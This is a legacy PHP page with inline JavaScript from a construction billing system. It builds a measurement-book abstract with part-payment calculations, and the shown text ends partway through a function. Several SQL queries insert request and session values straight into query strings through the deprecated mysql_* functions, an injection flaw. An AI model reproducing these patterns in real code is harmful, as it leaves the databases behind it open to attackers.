<?php
//session_start();
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
checkUser();
include "library/common.php";
include "spellnumber.php";
$msg = ''; $Line = 0;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMbIncr = 0; $UsedMBArr = array();
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy);
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			//echo key($DpmArrPayPercentList).'<br />';
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
function CheckPageBreak($tablehead,$abstmbno,$table,$page)
{
	$nextpage = $page+1;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>C/o Page No ".$nextpage."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	$Output .=  "<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page ".$page."</td></tr>";
	$Output .= "</table>";
	$Output .= "<p  style='page-break-after:always;'></p>";
	$Output .= '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
				<tr style="border:none;"><td align="right" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;</td></tr>
				</table>';
	$Output .= $table;
	$Output .= "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
	$Output .= $tablehead;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>B/f from Page No ".$page."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	echo $Output;
}

/*function UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page)
{
	$update_pageno_sql = "update measurementbook_temp set abstmbookno = '$abstmbno', abstmbpage = '$page' where sheetid	= '$abstsheetid' AND subdivid = '$subdivid'";
	$update_pageno_query = mysql_query($update_pageno_sql);
}*/
$staffid 		= 	$_SESSION['sid'];
$userid 		= 	$_SESSION['userid'];
if(($_GET['rbnView'] != "") && ($_GET['SheetidView'] != "")){
	$rbn 			= 	$_GET['rbnView'];
	$abstsheetid 	= 	$_GET['SheetidView'];
}
$_SESSION["abstsheetid"] = 	$abstsheetid;
//$rbn    		= 	$_SESSION["rbn"]; 
//$abstsheetid    = 	$_SESSION["abstsheetid"];   $abstmbno 	= 	$_SESSION["abs_mbno"];  $abstmbpage  	= 	$_SESSION["abs_page"];	
//$fromdate       = 	$_SESSION['fromdate'];      $todate   	= 	$_SESSION['todate'];    $abs_mbno_id 	= 	$_SESSION["abs_mbno_id"];
$selectmbook_detail = " select DISTINCT fromdate, todate, rbn, abstmbookno, is_finalbill FROM measurementbook WHERE sheetid = '$abstsheetid' and rbn = '$rbn'";
//echo $selectmbook_detail;
$selectmbook_detail_sql = mysql_query($selectmbook_detail);
if ($selectmbook_detail_sql == true) 
{
	$Listmbdetail 		= 	mysql_fetch_object($selectmbook_detail_sql);
	$fromdate 			= 	$Listmbdetail->fromdate; $todate = $Listmbdetail->todate; $rbn = $Listmbdetail->rbn; 
	//$abstmbno = $Listmbdetail->abstmbookno;
	$is_finalbill 		= 	$Listmbdetail->is_finalbill;
	//$abstmbpage_query 	= 	"select mbpage, allotmentid from mbookallotment WHERE sheetid = '$abstsheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$abstmbno'";
	//$abstmbpage_sql 	= 	mysql_query($abstmbpage_query);
	//$Listmbook 			= 	mysql_fetch_object($abstmbpage_sql);
	//$abstmbpage 		= 	$Listmbook->mbpage+1; $abs_mbno_id = $Listmbook->allotmentid;
}
$paymentpercent = 	$_SESSION["paymentpercent"];	$emptypage 	= $_SESSION['emptypage'];

if($emptypage == "")
{
	$emptypage = 0;
}
/*$empty_page_update_sql = "update mymbook set emptypage = '$emptypage' where sheetid = '$abstsheetid' and mbno = '$abstmbno' and  mtype = 'A' and rbn = '$rbn' and genlevel = 'abstract'";
$empty_page_update_query = mysql_query($empty_page_update_sql);*/

$NextMBFlag = 0; $NextMBList = array(); $NextMBPageList = array(); $NextMBFlag = 1;
$SelectMBookQuery = "select * from mymbook where sheetid = '$abstsheetid' and rbn = '$rbn' and mtype = 'A' and genlevel = 'abstract' order by mbookorder asc";
$SelectMBookSql = mysql_query($SelectMBookQuery);
if($SelectMBookSql == true){
	if(mysql_num_rows($SelectMBookSql)>0){
		while($MBList = mysql_fetch_object($SelectMBookSql)){
			if($MBList->mbookorder == 1){ 
				$abstmbno = $MBList->mbno; //echo "1 = ".$abstmbno."<br/>";
				$abstmbpage = $MBList->startpage;
			}else{
				$SelectMB 		= $MBList->mbno; 
				$SelectMBPage 	= $MBList->startpage;
				if($SelectMBPage != ''){
					array_push($NextMBList,$SelectMB); //echo $SelectMBPage."SS<br/>";
					array_push($NextMBPageList,$SelectMBPage);
				}
			}
		}
	}
}
//echo $abstmbno."<br/>";
//print_r($NextMBList);exit;
/*if($_POST["Submit"] == "Confirm")
{	
	
	
	$AbstractStr 			= 	$_POST['txt_abstractstr'];
	$SubdividSlmStr 		= 	$_POST['txt_subdivid_slmstr'];
	$runningbillno 			= 	$_POST['txt_rbn_no'];
	
	$select_mymbook_sql = "SELECT MAX(endpage) as maxpage, mbookorder, mbno FROM mymbook WHERE sheetid = '$abstsheetid' and rbn = '$runningbillno' GROUP BY mbno ORDER BY mbookorder ASC";
	$select_mymbook_query = mysql_query($select_mymbook_sql);
	//echo $select_mymbook_sql."<br/>";
	if(mysql_num_rows($select_mymbook_query)>0)
	{
		while($MBKList = mysql_fetch_object($select_mymbook_query))
		{
			$maxpage 	= $MBKList->maxpage;
			$mbook 		= $MBKList->mbno;
			if($maxpage == 100)
			{
				$update_mbookpage_sql_2 = "update agreementmbookallotment set active = 0 WHERE sheetid = '$abstsheetid' and mbno = '$mbook'";
				$update_mbookpage_query_2 = mysql_query($update_mbookpage_sql_2);
				
				$update_mbookpage_sql = "update mbookallotment set mbpage = '$maxpage', active = 0 WHERE sheetid = '$abstsheetid' and mbno = '$mbook'";
			}
			else
			{
				$update_mbookpage_sql = "update mbookallotment set mbpage = '$maxpage' WHERE sheetid = '$abstsheetid' and mbno = '$mbook'";
				//echo $update_mbookpage_sql."<br/>";
			}
			$update_mbookpage_query = mysql_query($update_mbookpage_sql);
		}
	}
	//exit;
	//echo $select_mymbook_sql;exit;
	if($SubdividSlmStr != "")
	{
		$explodeSubdividSlmStr	=	explode("*",rtrim($SubdividSlmStr,"*"));
		$explodeAbstractStr		=	explode("*",rtrim($AbstractStr,"*"));
		for($x7=0; $x7<count($explodeAbstractStr); $x7+=8)
		{
			$Divid_dmy			=	$explodeAbstractStr[$x7+0];
			$Subdivid_dmy		=	$explodeAbstractStr[$x7+1];
			$FromDate_dmy		=	$explodeAbstractStr[$x7+2];
			$ToDate_dmy			=	$explodeAbstractStr[$x7+3];
			$RbnNo_dmy			=	$explodeAbstractStr[$x7+4];
			$Sheetid_dmy		=	$explodeAbstractStr[$x7+5];
			$AMbookNo_dmy		=	$explodeAbstractStr[$x7+6];
			$AMbookPage_dmy		=	$explodeAbstractStr[$x7+7];
			$partpay_flag_dmy	=	"DMY";
			if(!in_array($Subdivid_dmy, $explodeSubdividSlmStr))
			{
				$insert_mbook_dummy_sql 	= 	"insert into 
												measurementbook (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, abstmbookno, abstmbpage,  part_pay_flag, rbn, active, userid) 
												values (NOW(), '$staffid', '$Sheetid_dmy', '$Divid_dmy', '$Subdivid_dmy', '$FromDate_dmy', '$ToDate_dmy', '$AMbookNo_dmy', '$AMbookPage_dmy', '$partpay_flag_dmy', '$RbnNo_dmy', '1', '$userid')";
				$insert_mbook_dummy_query 	= 	mysql_query($insert_mbook_dummy_sql);
				//echo $insert_mbook_dummy_sql."<br/>";
			}
		}
	}
										//echo $insert_mbook_dummy_sql."<br/>";
										//echo $SubdividSlmStr."<br/>";
										//exit;

	$max_page_abs 			= 	$_POST['txt_maxpage'];
	$abstmbno 				= 	$_POST['txt_abstmbno'];
    $currentquantity 			= 	trim($_POST['currentquantity']);
	$mbookquery					=	"INSERT INTO measurementbook  (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks) SELECT  now(), staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks FROM measurementbook_temp WHERE sheetid = '$abstsheetid'";// WHERE flag =1 OR flag = 2";
   	$mbooksql 					= 	mysql_query($mbookquery);   
    $sheetquery 				= 	"UPDATE sheet SET rbn = '$runningbillno' WHERE sheet_id ='$abstsheetid'";//AND STAFFID
    $sheetsql 					= 	dbQuery($sheetquery);
	
	
	
	$newmbooksql 				= 	"DELETE FROM oldmbook WHERE sheetid = '$abstsheetid'";// DELETE NEW MBOOK TABLE
	$result1 					= 	dbQuery($newmbooksql);
	$mbookgeneratedelsql		= 	"DELETE FROM mbookgenerate WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK GENERATE TABLE
    $result2 					= 	dbQuery($mbookgeneratedelsql);
	$mbooktempdelsql 			= 	"DELETE FROM measurementbook_temp WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK TEMP TABLE
    $result3 					= 	dbQuery($mbooktempdelsql);
	if($is_finalbill == "Y")
	{
		$deactivate_sheet_query = 	"update sheet set active = '0' WHERE sheet_id = '$abstsheetid'";
		$deactivate_sheet_sql 	= 	mysql_query($deactivate_sheet_query);
	}
	//header('Location: AbsGenerate_Partpay.php');
}*/

// Commented on 29.12.2016 by Prabasingh for Double time stored in mesaurement book table

/*$checkPartpay_sql 	= 	"select * from measurementbook_temp where sheetid = '$abstsheetid'";
$checkPartpay_query = 	mysql_query($checkPartpay_sql);
if(mysql_num_rows($checkPartpay_query)>0)
{
	$check = 1;
}
else
{
	$check = 0;
	$insermbook_temp_sql 	= 	"INSERT INTO measurementbook_temp (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill)
SELECT mbgeneratedate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  '100', flag, 0, rbn, active, userid, is_finalbill FROM mbookgenerate where mbookgenerate.sheetid = '$abstsheetid'";
$insermbook_temp_query 		= 	mysql_query($insermbook_temp_sql);
}*/


$query 		= 	"SELECT * FROM sheet WHERE sheet_id ='$abstsheetid' ";
$sqlquery 	= 	mysql_query($query);
if ($sqlquery == true) 
{
    $List 					= 	mysql_fetch_object($sqlquery);
    $work_name 				= 	$List->work_name; 
	$short_name 			= 	$List->short_name;   
	$tech_sanction 			= 	$List->tech_sanction;  
    $name_contractor 		= 	$List->name_contractor; 
	$ccno 					= 	$List->computer_code_no;    
	$agree_no 				= 	$List->agree_no; 
	$overall_rebate_perc 	= 	$List->rebate_percent; 
	$runn_acc_bill_no 		= 	$rbn;
	$work_order_no 			= 	$List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length1 				= 	strlen($work_name);
 	$start_line1 			= 	ceil($length1/70); 
	$length2 				= 	strlen($agree_no);
	$start_line2 			= 	ceil($length2/27);  
	$LineIncr 				= 	$start_line1 + $start_line2 + 2 + 2; 
}
$Line = $Line + $LineIncr;
//echo $LineIncr;


$CVSubdividArr = array(); $CVAgmtWtArr = array(); $CVUsedWtArr = array(); $CVDiffWtArr = array();  $CVRateArr = array(); $CVTypeArr = array();
$TVSubdividArr = array(); $TVAgmtWtArr = array(); $TVUsedWtArr = array(); $TVDiffWtArr = array();  $TVRateArr = array(); $TVTypeArr = array();
$select_cem_var_query 	= "select * from cement_temp_variation where sheetid = '$abstsheetid'";
$select_cem_var_sql 	= mysql_query($select_cem_var_query);
if($select_cem_var_sql == true){
	while($VList = mysql_fetch_object($select_cem_var_sql)){
		$CVSubdivid = $VList->subdivid;
		if($VList->variat_type == "C"){
			$CVSubdividArr[$CVSubdivid] = $CVSubdivid;
			$CVAgmtWtArr[$CVSubdivid] 	= $VList->as_agmt_wt;
			$CVUsedWtArr[$CVSubdivid] 	= $VList->as_used_wt;
			$CVDiffWtArr[$CVSubdivid] 	= $VList->difference_wt;
			$CVRateArr[$CVSubdivid] 	= $VList->rate;
			$CVTypeArr[$CVSubdivid] 	= $VList->variat_type;
		}
		if($VList->variat_type == "T"){
			$TVSubdividArr[$CVSubdivid] = $CVSubdivid;
			$TVAgmtWtArr[$CVSubdivid] 	= $VList->as_agmt_wt;
			$TVUsedWtArr[$CVSubdivid] 	= $VList->as_used_wt;
			$TVDiffWtArr[$CVSubdivid] 	= $VList->difference_wt;
			$TVRateArr[$CVSubdivid] 	= $VList->rate;
			$TVTypeArr[$CVSubdivid] 	= $VList->variat_type;
		}  
	}
}
//print_r($CVDiffWtArr);exit;
$select_new_mbook_no_query1 = "select gen_version from mymbook where sheetid = '$abstsheetid' AND rbn = '$rbn' AND mbookorder = '1' AND mtype = 'A' AND  genlevel = 'abstract' and mbno = '$abstmbno'";
$select_new_mbook_no_sql1 = mysql_query($select_new_mbook_no_query1);
if($select_new_mbook_no_sql1 == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql1)>0)
	{
		$NMBList1 = mysql_fetch_object($select_new_mbook_no_sql1);
		$gen_version = $NMBList1->gen_version;
	}
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
	<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
	<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
	<link rel="stylesheet" href="css/button_style.css"></link>
	<link rel="stylesheet" href="js/jquery-ui.css">
	<script src="js/jquery-1.10.2.js"></script>
	<script src="js/jquery-ui.js"></script>
	<link rel="stylesheet" href="/resources/demos/style.css">
	<link rel="stylesheet" href="Font style/font.css" />
	<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
	<script type='text/javascript' src='js/basic_model_jquery.js'></script>
	<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
	<link rel="stylesheet" href="css/font-awesome.css" />
	<!--<script type='text/javascript' src='js/basic.js'></script>-->
	<script src="dist/sweetalert-dev.js"></script>
	<link rel="stylesheet" href="dist/sweetalert.css">
	<link rel="stylesheet" href="css/tooltip.css" />
<script type="text/javascript" language="javascript">
	function printBook()
	{
		window.print();
	}
	function goBack()
	{
		url = "RunningbillView.php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				return false;
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetails[j+0];
									remarkRbn 		= searchflagdetails[j+1];
									remarkDate 		= searchflagdetails[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
